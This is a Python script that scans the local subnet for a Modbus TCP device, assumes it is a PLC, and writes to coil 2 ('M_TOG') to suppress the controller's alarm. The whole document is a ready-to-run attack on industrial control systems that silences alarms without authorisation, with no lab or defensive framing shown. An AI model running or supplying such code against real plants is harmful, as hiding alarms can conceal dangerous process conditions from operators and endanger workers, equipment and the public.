import socket
import netifaces as ni
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

# Function to scan the network for the PLC
def find_plc_ip():
    # Get the IP address of the local machine
    local_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    network = '.'.join(local_ip.split('.')[:-1]) + '.'
    
    # Scan the network for the PLC
    for i in range(1, 255):
        ip = f"{network}{i}"
        try:
            # Attempt to connect to the Modbus server on the IP
            client = ModbusTcpClient(ip)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except ConnectionException:
            continue
    return None

# Function to suppress the alarm by setting M_TOG to TRUE
def suppress_alarm(plc_ip):
    client = ModbusTcpClient(plc_ip)
    try:
        if client.connect():
            # Write to the M_TOG memory bit (address 2)
            result = client.write_coil(2, True)
            if result.isError():
                print("Failed to suppress the alarm.")
            else:
                print("Alarm suppressed successfully.")
        else:
            print("Failed to connect to the PLC.")
    except ConnectionException:
        print("Connection to the PLC failed.")
    finally:
        client.close()

# Main function
def main():
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Suppress the alarm
        suppress_alarm(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()